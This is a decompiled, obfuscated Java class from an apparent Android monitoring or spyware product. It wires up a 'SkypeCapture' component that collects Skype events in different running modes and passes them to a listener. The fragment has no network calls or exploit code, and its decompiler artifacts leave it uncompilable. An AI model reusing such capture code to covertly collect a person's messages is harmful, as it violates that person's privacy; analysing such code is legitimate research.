package com.vvt.capture.e;

import com.vvt.base.RunningMode;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.e;
import com.vvt.base.capture.f;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Iterator;
import java.util.List;

public class c
  extends com.vvt.base.capture.b
  implements com.vvt.base.capture.a
{
  private static final boolean a = com.vvt.ak.a.b;
  private com.vvt.base.a b;
  private String c;
  private e d;
  private f e;
  private com.vvt.base.b f;
  
  public c(String paramString, com.vvt.base.a parama, RunningMode paramRunningMode, com.vvt.n.a.b paramb, com.vvt.base.b paramb1)
  {
    this.c = paramString;
    this.b = parama;
    this.f = paramb1;
    Object localObject1 = RunningMode.FULL;
    boolean bool;
    Object localObject2;
    if (paramRunningMode == localObject1)
    {
      bool = a;
      if (bool) {}
      localObject1 = new com/vvt/capture/e/b/a/b;
      ((com.vvt.capture.e.b.a.b)localObject1).<init>();
      ((com.vvt.capture.e.b.a.b)localObject1).a(this);
      this.d = ((e)localObject1);
      localObject1 = new com/vvt/capture/e/b/a/g;
      localObject2 = this.f;
      ((com.vvt.capture.e.b.a.g)localObject1).<init>(paramString, (com.vvt.base.b)localObject2);
      this.e = ((f)localObject1);
    }
    for (;;)
    {
      return;
      localObject1 = RunningMode.LIMITED_1;
      if (paramRunningMode == localObject1)
      {
        bool = a;
        if (bool) {}
        localObject1 = new com/vvt/capture/e/b/b/a;
        localObject2 = this.c;
        Object localObject3 = this.f.f();
        ((com.vvt.capture.e.b.b.a)localObject1).<init>(paramb, (String)localObject2, (String)localObject3);
        ((com.vvt.capture.e.b.b.a)localObject1).a(this);
        this.d = ((e)localObject1);
        localObject1 = new com/vvt/capture/e/b/b/c;
        localObject2 = this.c;
        localObject3 = this.f;
        ((com.vvt.capture.e.b.b.c)localObject1).<init>((String)localObject2, (com.vvt.base.b)localObject3);
        this.e = ((f)localObject1);
      }
      else
      {
        bool = a;
        if (!bool) {}
      }
    }
  }
  
  protected com.vvt.base.capture.g a(com.vvt.base.capture.g paramg)
  {
    boolean bool = paramg instanceof FxSimpleEventReference;
    if (bool) {
      paramg = (FxSimpleEventReference)paramg;
    }
    for (;;)
    {
      return paramg;
      paramg = new com/vvt/base/capture/FxSimpleEventReference;
      paramg.<init>();
    }
  }
  
  public void a()
  {
    boolean bool = a;
    if (bool) {}
    Object localObject = this.e;
    bool = localObject instanceof com.vvt.capture.e.b.a.g;
    if (bool)
    {
      localObject = (com.vvt.capture.e.b.a.g)this.e;
      ((com.vvt.capture.e.b.a.g)localObject).b();
    }
    for (;;)
    {
      i();
      bool = a;
      if (bool) {}
      return;
      localObject = this.e;
      bool = localObject instanceof com.vvt.capture.e.b.b.c;
      if (bool)
      {
        localObject = (com.vvt.capture.e.b.b.c)this.e;
        ((com.vvt.capture.e.b.b.c)localObject).b();
      }
    }
  }
  
  public void a(com.vvt.base.b paramb)
  {
    this.f = paramb;
    boolean bool = a;
    if (bool) {}
  }
  
  protected void a(List paramList)
  {
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    boolean bool1 = a;
    if ((!bool1) || (paramList != null))
    {
      Iterator localIterator = paramList.iterator();
      for (;;)
      {
        bool1 = localIterator.hasNext();
        if (!bool1) {
          break;
        }
        localObject = localIterator.next();
        boolean bool3 = localObject instanceof com.vvt.capture.e.a.c;
        if (bool3)
        {
          localObject = d.a((com.vvt.capture.e.a.c)localObject);
          if (localObject != null)
          {
            int j = ((List)localObject).size();
            if (j > 0) {
              localArrayList.addAll((Collection)localObject);
            }
          }
        }
      }
      Object localObject = this.b;
      if (localObject != null)
      {
        int i = localArrayList.size();
        if (i > 0)
        {
          boolean bool2 = k();
          if (bool2)
          {
            localObject = this.b;
            ((com.vvt.base.a)localObject).a(localArrayList);
          }
        }
      }
    }
  }
  
  protected e b()
  {
    return this.d;
  }
  
  protected f c()
  {
    return this.e;
  }
  
  protected String d()
  {
    return "SkypeCapture";
  }
  
  protected String e()
  {
    return this.c;
  }
  
  protected String f()
  {
    return "skype.ref";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */